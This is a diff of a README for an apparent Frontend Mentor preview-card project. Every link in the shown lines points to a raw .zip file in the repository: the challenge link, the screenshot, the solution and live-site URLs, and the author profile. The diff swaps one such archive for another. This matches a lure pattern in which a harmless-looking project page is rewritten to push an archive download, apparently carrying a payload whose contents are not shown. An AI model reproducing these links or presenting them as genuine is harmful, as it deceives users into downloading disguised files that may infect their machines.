@@ -1,6 +1,6 @@
 # Frontend Mentor - Stats preview card component solution
 
-This is a solution to the [3-column preview card component challenge on Frontend Mentor](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [3-column preview card component challenge on Frontend Mentor](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/design/column_component_card_preview_v3.3.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -20,13 +20,13 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
+![Screenshot of the site](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/design/column_component_card_preview_v3.3.zip)
 
 ### Links
 
-- Solution URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
-- Live Site URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
+- Solution URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/design/column_component_card_preview_v3.3.zip)
+- Live Site URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/design/column_component_card_preview_v3.3.zip)
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
+- Frontend Mentor - [@imadosan](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/design/column_component_card_preview_v3.3.zip)
